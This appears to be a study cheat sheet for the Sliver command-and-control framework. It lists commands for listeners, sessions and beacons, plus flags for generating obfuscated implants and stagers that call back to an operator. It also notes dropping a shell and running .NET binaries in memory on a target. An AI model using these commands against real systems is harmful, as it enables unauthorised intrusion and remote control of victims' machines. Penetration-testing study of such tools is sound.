  help <command>                help page for indivudal command
  <command> -h                  help page for indivudal command
  implants                      view all previously generated implant binaries
  jobs                          manage jobs/listeners
  regenerate <IMPLANT_NAME>     use if you need to re-download a previously generated implant
  mtls, http, https, dns        start a listener depending on protocol
  profiles                      list profiles
  use <SESSION_ID>              interact with active session/beacon
  sessions                      list sessions
  beacons                       list beacons

Beacon mode:
  info                          list basic system information
  tasks                         show proggress of each task
  interactive                   switch to session mode
  shell                         drop a system shell (only use interactive sessions when you have to)
  execute-assembly <PATH>       allows us to run .NET binaries on the target machine, without uploading them.

Generating Implants (beacon mode):
  generate beacon -h            generate new beacon
  -J, --jitter                  sets up the jitter time of the callback from the implant in a manner that will fluctuate based on the value
  -S, --seconds                 which allows us to set the time interval of the callback by default every 60 seconds we will receive a callback
                                either a check-up and/or output containing the results of our query/command
  --skip-symbols                do not obfuscate an implant (obfuscates by default)
  -o, --os                      operating system (default: windows)
  -b, --http <LHOST>            http(s) connection strings
  -N, --name <NAME>             agent name

Generating Implants (session mode):
  generate stager -h            generate new stager
  -L, --lhost <LHOST>           interface to bind server to
  -l, --lport <PORT>            tcp listen port (default 8888)
  -r, --protocol <STRING>       staging protocol (tcp/http/https) (default: tcp)
  -s, --save                    specify an output. By default implants are saved in cwd

Informational:
  When interacting with sessions in Sliver, the names are usually RED, and the beacon ones are in BLUE. Knowing that difference can be helpful as the sessions are interactive, and the beacons are not.
